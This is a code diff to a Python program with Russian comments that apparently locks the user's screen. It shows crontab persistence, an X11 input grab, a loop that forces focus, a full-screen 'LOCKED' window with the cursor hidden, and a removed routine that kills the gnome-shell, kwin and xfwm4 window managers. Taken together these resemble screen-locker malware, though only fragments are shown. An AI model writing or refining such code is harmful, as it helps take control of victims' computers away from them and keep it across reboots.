@@ -17,7 +17,7 @@ def add_to_crontab():
         subprocess.call(["crontab", "/tmp/crontab_new"])
         os.unlink("/tmp/crontab_new")
 
-# ---------- жесткий захват ввода через X11 ----------
+# ---------- захват ввода ----------
 def hard_grab():
     try:
         import Xlib.display
@@ -33,7 +33,7 @@ def hard_grab():
     except Exception as e:
         print("Ошибка захвата:", e)
 
-# ---------- принудительное удержание фокуса ----------
+# ---------- удержание фокуса ----------
 def force_focus():
     try:
         import Xlib.display
@@ -52,12 +52,6 @@ def force_focus():
                 time.sleep(0.1)
     except:
         pass
-
-# ---------- убить оконный менеджер ----------
-def kill_wm():
-    subprocess.call(["pkill", "-f", "gnome-shell"])
-    subprocess.call(["pkill", "-f", "kwin"])
-    subprocess.call(["pkill", "-f", "xfwm4"])
 
 # ---------- звук ----------
 def play_sound():
@@ -83,9 +77,12 @@ screen = pygame.display.set_mode((info.current_w, info.current_h),
 pygame.display.set_caption("LOCKED")
 pygame.mouse.set_visible(False)
 
+# Даём окну время появиться
+time.sleep(0.5)
+
+# Захват и фокус
 hard_grab()
 threading.Thread(target=force_focus, daemon=True).start()
-kill_wm()
 
 font = pygame.font.SysFont("monospace", 28, bold=True)
 font_small = pygame.font.SysFont("monospace", 22)
